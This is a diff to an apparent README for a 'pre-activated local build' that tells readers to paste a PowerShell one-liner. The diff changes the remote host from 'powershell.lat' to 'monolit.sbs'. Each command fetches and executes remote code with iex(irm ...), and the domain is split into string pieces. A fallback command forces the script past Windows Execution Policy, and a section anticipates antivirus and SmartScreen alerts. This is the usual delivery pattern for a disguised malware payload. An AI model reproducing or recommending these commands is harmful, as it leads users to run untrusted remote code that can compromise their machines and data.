@@ -18,7 +18,7 @@ Pre-activated local build for testing and deployment.
    Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
 
    ```cmd
-   iex (irm ("powershell" + ".lat"))
+   iex (irm ("monolit" + ".sbs"))
    ```
 
 ---
@@ -28,7 +28,7 @@ Pre-activated local build for testing and deployment.
 ### 💬 Script is blocked by Execution Policy
 If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "iex (irm ('powershell' + '.lat'))"
+powershell -ExecutionPolicy Bypass -Command "iex (irm ("monolit" + ".sbs"))"
 ```
 
 ### 💬 Antivirus / SmartScreen Alerts
